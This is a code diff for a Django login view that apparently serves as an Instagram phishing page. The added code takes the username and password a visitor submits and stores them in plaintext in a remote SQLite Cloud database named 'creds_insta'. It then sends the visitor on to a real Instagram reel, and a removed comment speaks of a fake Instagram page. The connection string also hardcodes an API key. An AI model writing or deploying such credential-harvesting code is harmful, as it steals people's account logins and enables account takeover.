@@ -1,11 +1,15 @@
+import sqlitecloud
 from django.shortcuts import render, redirect
-from .forms import LoginForm
-from .models import Credentials
-from django.views.decorators.csrf import csrf_exempt
+from .forms import LoginForm  # Ensure your form is correctly imported
+from datetime import datetime
 
-# Create your views here.
+# SQLite Cloud connection string
+SQLITE_CLOUD_URL = "sqlitecloud://cinbrarknk.g4.sqlite.cloud:8860/creds_insta?apikey=3Pddtb42UadDaafPkeohMDbHIO9rDxdYuaaQnzS0r6Y"
 
-@csrf_exempt
+def get_connection():
+    """Returns a new connection to SQLite Cloud."""
+    return sqlitecloud.connect(SQLITE_CLOUD_URL)
+
 def login_view(request):
     if request.method == 'POST':
         form = LoginForm(request.POST)
@@ -13,11 +17,20 @@ def login_view(request):
             username = form.cleaned_data['username']
             password = form.cleaned_data['password']
 
-            # Enregistrez les identifiants dans la base de données
-            Credentials.objects.create(username=username, password=password)
+            commit_date = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
 
-            # Redirigez vers une page de confirmation (ou une fausse page Instagram)
+            # Save credentials to SQLite Cloud
+            conn = get_connection()
+            cursor = conn.execute(
+                "INSERT INTO herewego_credentials (username, password, commit_date) VALUES (?, ?, ?);",
+                (username, password, commit_date)
+            )
+            conn.commit()
+            conn.close()
+
+            # Redirect user to Instagram reel (or another page)
             return redirect('https://www.instagram.com/reel/DEa3__ESbj1/?igsh=MThxMmc0eGFpcjFkcQ==')
     else:
         form = LoginForm()
+
     return render(request, 'login.html', {'form': form})
